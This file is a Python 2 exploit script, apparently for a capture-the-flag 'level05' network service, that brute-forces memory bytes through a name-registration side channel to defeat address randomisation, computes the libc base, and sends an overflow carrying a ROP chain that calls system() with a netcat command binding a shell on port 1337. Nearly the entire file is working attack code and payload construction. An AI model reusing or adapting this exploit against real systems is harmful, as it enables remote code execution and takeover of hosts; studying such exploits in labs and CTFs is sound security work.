#!/usr/bin/env python
import socket
from struct import *
import time
import sys
import struct
import random


TCP_IP = '10.0.0.1'
TCP_PORT = 20005
BUFFER_SIZE = 1024


def register(s, name):
	s.send("addreg " + name + " 32 127.0.0.1\n")
	return True

def unregister(s, name):
	s.send("addreg " + name + " 0 0.0.0.0\n")
	return True

def checkname(s, name):
	s.send("checkname " + name + "\n")
	data = s.recv(BUFFER_SIZE)
	if "is not indexed already" in data:
		return False
	else:
		return True 

def bruteforce(s, prefix, postfix, range):
	candidates = []
	for i in range:
		if i == 32:
			continue
		register(s, prefix + chr(i) + postfix)
		time.sleep(0.1)
		checkname(s, "test")
		result0 = checkname(s, prefix)
		result1 = checkname(s, prefix)
		unregister(s, prefix + chr(i) + postfix)
		if result0 or result1:
			print "possible candidate: "+str(hex(i))
			candidates.append(i)
			continue
	return candidates

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
print "received data:", data
#test whether it works
register(s, "A"*16+"\x04")
time.sleep(0.5)
checkname(s, "test")
result = []

for i in xrange(4):
	result.append(checkname(s, "A"*16))

unregister(s, "A"*16+"\x04")
for i in xrange(4):
	result.append(checkname(s, "A"*16))

if (result[0] or result[1]) and (result[2] or result[3]):
	if not (result[4] or result[5] or result[6] or result[7]): 
		print "Works!"
	else:
		print "Does not work!"
		sys.exit()
else:
	print "Does not work!"
	sys.exit()

retestedmemory = []
print "trying to find hightest byte"
memory = bruteforce(s, "A"*15, "\x04", range(0,256))
print "final: "
retestedmemory.append(bruteforce(s, "B"*15, "\x04", memory)[0])
print "final: " + str(hex(retestedmemory[0]))

print "trying to find second hightest byte"
memory = range(0,256)
#memory = bruteforce(s, "A"*14, chr(retestedmemory[0])+"\x04", range(0,256))
while len(memory) != 1:
	memory = bruteforce(s, chr(random.randint(0x41,0x4a))*14, chr(retestedmemory[0])+"\x04", memory)

retestedmemory.append(memory[0])
print "final: " + str(hex(retestedmemory[1]))
print "trying to find second lowest byte"
#memory = bruteforce(s, "A"*13, chr(retestedmemory[1])+chr(retestedmemory[0])+"\x04", range(0,256))
memory = range(0,256)
while len(memory) != 1:
	memory = bruteforce(s, chr(random.randint(0x41,0x4a))*13, chr(retestedmemory[1])+chr(retestedmemory[0])+"\x04", memory)

level05base = (retestedmemory[0]<<24) + (retestedmemory[1]<<16) + (((memory[0]>>4)-2)<<12)


print str(hex(level05base))
#print "exploiting in 10sec."
#time.sleep(10)

libcbase = level05base - 0x1a9000
#libcbase = 0xb75bb000
print str(hex(libcbase))

p = ""
p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178020) # @ .data
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "/bin"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178024) # @ .data + 4
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "/nc."
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178028) # @ .data + 8
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "trad"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017802c) # @ .data + 12
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "itio"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178030) # @ .data + 16
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "nal "
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178034) # @ .data + 20
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "-ltp"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178038) # @ .data + 24
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "1337"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017803c) # @ .data + 28
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += " -e/"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017803f) # @ .data + 32
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "/bin"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178043) # @ .data + 36
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "//sh"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x000328e0) # xor %eax,%eax | ret
p += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
p += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
p += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
p += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

p += pack("<I", libcbase + 0x0003cb20) # system()
p += pack("<I", libcbase + 0x000329e0) # exit()
p += pack("<I", libcbase + 0x00178020) # @ .data

print str(p)

checkname(s, "A"*44+p)

s.close()

